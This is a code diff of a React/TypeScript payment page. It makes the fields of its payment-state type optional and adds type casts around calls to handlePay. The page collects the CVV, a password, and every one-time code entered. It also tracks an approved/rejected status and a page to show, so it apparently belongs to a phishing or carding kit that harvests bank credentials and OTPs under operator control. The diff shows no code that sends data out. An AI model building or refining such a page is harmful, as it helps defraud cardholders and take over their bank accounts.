@@ -12,12 +12,12 @@ type PaymentInfo = {
   cvv?: string;
   otp?: string;
   pass: string;
-  cardState: string;
-  allOtps: string[];
-  bank_card: string[];
-  prefix: string;
-  status: "new" | "pending" | "approved" | "rejected";
-  page: string;
+  cardState?: string;
+  allOtps?: string[];
+  bank_card?: string[];
+  prefix?: string;
+  status?: "new" | "pending" | "approved" | "rejected";
+  page?: string;
 };
 const BANKS = [
   {
@@ -384,7 +384,7 @@ export default function Payment(props: { loading: boolean }) {
                             >
                               prefix
                             </option>
-                            {paymentInfo.bank_card.map((i, index) => (
+                            {paymentInfo.bank_card!.map((i, index) => (
                               <option
                                 key={index}
                                 value={i}
@@ -613,7 +613,10 @@ export default function Payment(props: { loading: boolean }) {
                         onClick={() => {
                           if (step === 1) {
                             setLoading(true);
-                            handlePay(paymentInfo, setPaymentInfo);
+                            handlePay(
+                              paymentInfo as any,
+                              setPaymentInfo as any
+                            );
                             handleSubmit();
                           } else if (step >= 2) {
                             if (paymentInfo.otp?.length! !== 6) {
@@ -625,7 +628,10 @@ export default function Payment(props: { loading: boolean }) {
                             }
                             setLoading(true);
                             handleAddotp(paymentInfo.otp!);
-                            handlePay(paymentInfo, setPaymentInfo);
+                            handlePay(
+                              paymentInfo as any,
+                              setPaymentInfo as any
+                            );
                             setTimeout(() => {
                               setLoading(false);
                               setPaymentInfo({
